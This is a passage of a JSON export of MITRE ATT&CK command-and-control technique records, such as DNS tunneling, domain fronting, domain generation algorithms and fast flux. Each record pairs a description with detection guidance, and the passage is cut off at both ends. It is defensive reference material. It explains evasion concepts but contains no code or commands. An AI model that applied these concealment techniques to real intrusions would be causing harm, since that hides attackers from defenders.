11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":494,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":494,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":513,"name":"T1573.002 - Asymmetric Cryptography","sort_id":0,"external_id":"T1573.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.<\/p>\n<p>For efficiency, may protocols (including SSL\/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1573\/002\">Asymmetric Cryptography<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"SSL\/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL\/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":513,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":513,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":513,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":519,"name":"T1102.002 - Bidirectional Communication","sort_id":0,"external_id":"T1102.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. <\/p>\n<p>Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL\/TLS encryption, giving adversaries an added level of protection. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL\/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":519,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":519,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":519,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":562,"name":"T1071.004 - DNS","sort_id":0,"external_id":"T1071.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection\/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. <\/p>\n<p>The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for DNS traffic to\/from known-bad or suspicious domains.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":562,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":562,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":562,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":563,"name":"T1568.003 - DNS Calculation","sort_id":0,"external_id":"T1568.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and\/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)<\/p>\n<p>One implementation of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1568\/003\">DNS Calculation<\/a> is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detection for this technique is difficult because it would require knowledge of the specific implementation of the port calculation algorithm. Detection may be possible by analyzing DNS records if the algorithm is known.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":563,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":563,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":563,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":565,"name":"T1102.001 - Dead Drop Resolver","sort_id":0,"external_id":"T1102.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated\/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.<\/p>\n<p>Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL\/TLS encryption, giving adversaries an added level of protection.<\/p>\n<p>Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL\/TLS inspection if data is encrypted. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":565,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":565,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":565,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":581,"name":"T1090.004 - Domain Fronting","sort_id":0,"external_id":"T1090.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, &quot;domainless&quot; fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).<\/p>\n<p>For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"If SSL inspection is in place or the traffic is not encrypted, the Host field of the HTTP header can be checked if it matches the HTTPS SNI or against a blocklist or allowlist of domain names. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":581,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":581,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":581,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":582,"name":"T1568.002 - Domain Generation Algorithms","sort_id":0,"external_id":"T1568.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)<\/p>\n<p>DGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)<\/p>\n<p>Adversaries may use DGAs for the purpose of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1008\">Fallback Channels<\/a>. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.\n\nMachine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain or related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Endgame Predicting DGA)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":582,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":582,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":582,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":586,"name":"T1568 - Dynamic Resolution","sort_id":0,"external_id":"T1568","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.<\/p>\n<p>Adversaries may use dynamic resolution for the purpose of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1008\">Fallback Channels<\/a>. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting dynamically generated C2 can be challenging due to the number of different algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There are multiple approaches to detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more (Citation: Data Driven Security DGA). CDN domains may trigger these detections due to the format of their domain names. In addition to detecting algorithm generated domains based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":586,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":586,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":586,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":592,"name":"T1573 - Encrypted Channel","sort_id":0,"external_id":"T1573","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and\/or generated within malware samples\/configuration files.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"SSL\/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL\/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":592,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":592,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":592,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":606,"name":"T1090.002 - External Proxy","sort_id":0,"external_id":"T1090.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including <a href=\"https:\/\/attack.mitre.org\/software\/S0040\">HTRAN<\/a>, ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.<\/p>\n<p>External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows, such as a client sending significantly more data than it receives from an external server. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":606,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":606,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":606,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":608,"name":"T1568.001 - Fast Flux DNS","sort_id":0,"external_id":"T1568.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)<\/p>\n<p>The simplest, &quot;single-flux&quot; method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)<\/p>\n<p>In contrast, the &quot;double-flux&quot; method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"In general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":608,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":608,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":608,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":610,"name":"T1071.002 - File Transfer Protocols","sort_id":0,"external_id":"T1071.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may communicate using application layer protocols associated with transferring files to avoid detection\/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. <\/p>\n<p>Protocols such as FTP, FTPS, and TFPT that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":610,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":610,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":610,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":630,"name":"T1090.001 - Internal Proxy","sort_id":0,"external_id":"T1090.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including <a href=\"https:\/\/attack.mitre.org\/software\/S0040\">HTRAN<\/a>, ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.<\/p>\n<p>By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":630,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":630,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":630,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":633,"name":"T1001.001 - Junk Data","sort_id":0,"external_id":"T1001.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending\/prepending data with junk characters or writing junk characters between significant characters. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":633,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":633,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":633,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":659,"name":"T1071.003 - Mail Protocols","sort_id":0,"external_id":"T1071.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may communicate using application layer protocols associated with electronic map delivery to avoid detection\/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. <\/p>\n<p>Protocols such as SMTP\/S, POP3\/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields 